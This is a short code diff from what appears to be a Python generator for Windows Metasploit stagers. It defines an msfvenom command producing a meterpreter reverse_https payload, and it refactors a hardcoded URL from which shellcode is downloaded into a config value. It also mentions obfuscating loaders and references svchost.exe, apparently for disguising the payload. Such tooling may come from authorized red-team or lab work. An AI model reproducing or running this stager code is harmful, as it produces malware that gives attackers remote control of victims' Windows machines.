@@ -8,7 +8,6 @@ BASE_FILENAME = 'win_msf_stager'
 FN_CS = BASE_FILENAME + ".cs"
 
 MSFVENOM_CMD = f"msfvenom -p windows/x64/meterpreter/reverse_https LHOST={ak.LHOST} LPORT={ak.LPORT} -f raw -e generic/none"
-STAGER_URL = "http://192.168.49.65/sc"
 
 templates = {
   'exe': """
@@ -58,7 +57,7 @@ def get_shellcode(msfvenom_cmd):
   return shellcode
 
 def generate(args):
-  url_dl_code = ak.URL_DL_CODE.format(STAGER_URL=STAGER_URL)
+  url_dl_code = ak.URL_DL_CODE.format(STAGER_URL=ak.STAGER_URL)
 
   # Create obfuscator for loaders that need obfuscation
   exe_path = b"C:\\\\Windows\\system32\\svchost.exe"
